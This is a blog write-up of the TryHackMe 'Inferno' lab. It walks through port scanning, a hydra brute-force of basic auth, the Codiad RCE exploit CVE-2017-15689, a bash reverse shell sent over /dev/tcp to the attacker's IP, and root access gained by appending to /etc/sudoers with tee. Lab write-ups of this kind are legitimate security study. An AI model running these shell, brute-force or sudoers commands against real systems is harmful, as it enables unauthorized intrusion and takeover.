---
layout: post
author: Razor
title: "Tryhackme Inferno"
categories: [Tryhackme, Linux]
tags: [boot2root, medium-box, privilage escalation, cve, web exploitation, enumeration]     # TAG names should always be lowercase
image: assets/thm_inferno/bg.jpeg
toc: true
---

## Introduction
This is partical room from Tryhackme entitled Inferno with Medium difficulty. In this room we will learn about exploit HTTP basic auth and IDE Exploit and Linux Privilage escalation . In this case we will find the vulnerability in Codiad (CVE-2017-15689) without further ado, let's just start. link this room [here](https://tryhackme.com/room/inferno)

## Enumeration 

### Nmap 
```
$ nmap -sC -sV 10.10.51.44        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 22:51 WIB
Nmap scan report for 10.10.51.44
Host is up (0.35s latency).
Not shown: 978 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp?
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|_  256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
23/tcp   open  tcpwrapped
25/tcp   open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))                                                                                                                                       
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                      
|_http-title: Dante's Inferno                                                                                                                                                          
88/tcp   open  tcpwrapped                                                                                                                                                                         
106/tcp  open  pop3pw?                                                                                                                                                                            
110/tcp  open  tcpwrapped                                                                                                                                                                         
389/tcp  open  tcpwrapped                                                                                                                                                                         
443/tcp  open  tcpwrapped                                                                                                                                                                         
464/tcp  open  tcpwrapped                                                                                                                                                                         
636/tcp  open  tcpwrapped
777/tcp  open  tcpwrapped
783/tcp  open  tcpwrapped
808/tcp  open  ccproxy-http?
873/tcp  open  tcpwrapped
1001/tcp open  webpush?
1236/tcp open  tcpwrapped
1300/tcp open  tcpwrapped
2000/tcp open  tcpwrapped
5432/tcp open  tcpwrapped
6346/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.35 seconds
```
Nmap outputs multiple ports, but in this case we're only targeting ports 22 and 80, Now lets take a look port 80.

![img](/assets/thm_inferno/bg_1.jpeg)

I'm using go buster and i found /inferno, Now lets look at this : 

![img](/assets/thm_inferno/bg_2.jpeg)

In this form login i want to use hydra to bruteforce password of admin, lets do this. 

```
$ hydra -l admin -P /home/razor/Documents/Wordlist/rockyou.txt 10.10.51.44 http-get /inferno/ -I -t 64
```
![img](/assets/thm_inferno/bg_3.jpeg)

We did it to get the password from the admin user, now we can login with the admin

![img](/assets/thm_inferno/bg_4.jpeg)

After we login in codiad and post login we can see the page like this. 

![img](/assets/thm_inferno/bg_5.jpeg)

## Foothold

after i did some research, i found CVE-2017-15689 which we can see [here](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit). Now lets exploit this :

![img](/assets/thm_inferno/bg_6.jpeg)

- Here we just need to enter a command like this: `$ sudo python exploit.py http://admin:dante1@10.10.51.44/inferno/ admin dante1 10.2.47.251 1234 linux`
- Seccond Term : `$ echo 'bash -c "bash -i >/dev/tcp/10.2.47.251/1235 0>&1 2>&1"' | nc -lnvp 1234 `
- Third Term : `$ nc -lnvp 1235`

but here there is a problem where bash will exit after a few seconds, so here I use /bin/sh to get a stable shell. After looking around i found .download.dat in home directory dante : `/home/dante/Downloads/.download.dat`

![img](/assets/thm_inferno/bg_7.jpeg)

And there is HEX code, We can Decode to ASCII with xxd : `$ cat hexcred|xxd -r -p`

![img](/assets/thm_inferno/bg_8.jpeg)

Now we found credential for dante, Then we can login with ssh to user dante :

![img](/assets/thm_inferno/bg_9.jpeg)

## Privilage Escalation

In this case we can exploit /usr/bin/tee and getting a root. I got this from [GTFObins](https://gtfobins.github.io/gtfobins/tee/#suid)

Exploit : `$ echo "dante ALL=(ALL) ALL"| sudo tee -a /etc/sudoers o tee -a /etc/sudoers`

Since the dante user has full 'tee' access, we can edit all configuration files to get root

![img](/assets/thm_inferno/bg_10.jpeg)

Now we are root!! 

Happy hacking :D